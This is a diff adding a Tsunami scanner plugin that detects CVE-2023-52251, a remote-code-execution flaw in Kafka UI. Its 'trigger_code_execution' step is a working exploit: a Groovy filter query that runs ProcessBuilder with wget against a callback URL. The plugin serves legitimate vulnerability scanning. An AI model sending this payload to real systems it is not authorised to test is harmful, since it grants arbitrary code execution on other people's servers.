@@ -1,0 +1,133 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "KafkaUi_CVE_2023_52251"
+  author: "joernNNN"
+  version: "1.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "CVE-2023-52251"
+  }
+  severity: CRITICAL
+  title: "Critical Remote Code Execution Vulnerability in Kafka UI (CVE-2023-52251)"
+  description: "Kafka UI, a tool for managing and monitoring Apache Kafka clusters, contains a critical vulnerability that allows remote execution of arbitrary code. Exploitation of this flaw can lead to system compromise, data theft, or service disruption. Immediate patching is strongly advised."
+  recommendation: "Update the version to 0.13.0 or later."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2023-52251"
+  }
+}
+
+config: {}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "fingerprint_kafka_ui"
+  http_request: {
+    method: GET
+    uri: "/does-not-exist"
+    response: {
+      http_status: 404
+      expect_all: {
+        conditions: [
+          { body: {} contains: "org.springframework.web.server.ResponseStatusException: 404 NOT_FOUND" },
+          { body: {} contains: "com.provectus.kafka.ui.config" },
+          { body: {} contains: "com.provectus.kafka.ui.config.ReadOnlyModeFilter" }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "create_sample_topic"
+  cleanup_actions: "delete_topic"
+  http_request: {
+    method: POST
+    uri: "/api/clusters/local/topics"
+    headers: [
+      { name: "Content-Type" value: "application/json" }
+    ]
+    data: "{\"name\":\"tsunami-security-scanner\",\"partitions\":1,\"configs\":{\"cleanup.policy\":\"delete\",\"retention.bytes\":\"-1\"}}"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "{\"name\":\"tsunami-security-scanner\",\"internal\":false,\"partitionCount\":1,\"replicationFactor\":1," }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "create_sample_messages"
+  http_request: {
+    method: POST
+    uri: "/api/clusters/local/topics/tsunami-security-scanner/messages"
+    headers: [
+      { name: "Content-Type" value: "application/json" }
+    ]
+    data: "{\"partition\":0,\"key\":\"123\",\"content\":\"123\",\"keySerde\":\"String\",\"valueSerde\":\"String\"}"
+    response: {
+      http_status: 200
+    }
+  }
+}
+
+actions: {
+  name: "trigger_code_execution"
+  http_request: {
+    method: GET
+    uri: "/api/clusters/local/topics/tsunami-security-scanner/messages?q=new ProcessBuilder(\"wget\",\"{{ T_CBS_URI }}\").start()&filterQueryType=GROOVY_SCRIPT"
+  }
+}
+
+actions: {
+  name: "delete_topic"
+  http_request: {
+    method: DELETE
+    uri: "/api/clusters/local/topics/tsunami-security-scanner"
+    response: {
+      http_status: 200
+    }
+  }
+}
+
+actions: {
+  name: "sleep"
+  utility: { sleep: { duration_ms: 2000 } }
+}
+
+actions: {
+  name: "check_callback_server_logs"
+  callback_server: { action_type: CHECK }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  condition: REQUIRES_CALLBACK_SERVER
+  actions: [
+    "fingerprint_kafka_ui",
+    "create_sample_topic",
+    "create_sample_messages",
+    "trigger_code_execution",
+    "sleep",
+    "check_callback_server_logs"
+  ]
+}
